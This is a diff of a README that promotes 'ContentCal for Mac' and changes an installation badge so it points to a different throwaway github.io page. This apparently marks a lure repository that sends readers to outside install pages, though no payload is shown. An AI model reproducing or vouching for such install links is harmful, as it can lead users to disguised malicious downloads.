@@ -3,7 +3,7 @@
 
 ContentCal for Mac provides a powerful desktop solution for marketers, agencies, and businesses to plan, schedule, and publish social media content. The Mac desktop version ensures smoother workflows, team collaboration, and an optimized interface built for professionals. Follow the instructions below to get started. 📅  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://shieldbestplays13.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=ContentCal)
 
 ---
 
